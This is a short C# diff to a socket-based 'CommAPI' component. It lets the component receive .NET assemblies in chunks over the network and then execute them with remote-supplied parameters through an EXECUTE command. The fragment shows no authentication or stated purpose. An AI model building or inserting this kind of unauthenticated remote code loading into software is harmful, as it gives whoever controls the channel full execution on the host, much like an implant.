@@ -5,6 +5,8 @@ using System.Diagnostics;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Security;
+using System.Security.Policy;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -52,15 +54,12 @@ namespace CommAPI
 			switch(payload.command)
 			{
 				case CommandType.DOWNLOAD:
-					commUtil.storeAssembly(payload.assemblyName, payload.assemblyBytes);
+				case CommandType.APPEND_ASSEMBLY:
+					commUtil.storeAssembly(payload.assemblyName, payload.assemblyBytes,payload.isAppend,payload.remainingPayloads);
 				break;
 
 				case CommandType.EXECUTE:
 					executeTask(payload.assemblyName, payload.parameters);
-				break;
-
-				case CommandType.APPEND_ASSEMBLY:
-					commUtil.storeAssembly(payload.assemblyName, payload.assemblyBytes,true);
 				break;
 
 			}
@@ -95,7 +94,7 @@ namespace CommAPI
 
 		private void executeTask(string assemblyName, object parameters)
 		{
-			throw new NotImplementedException();
+			string result=commUtil.executeAssembly(assemblyName, parameters);
 		}
 
 		private void pingHandler()
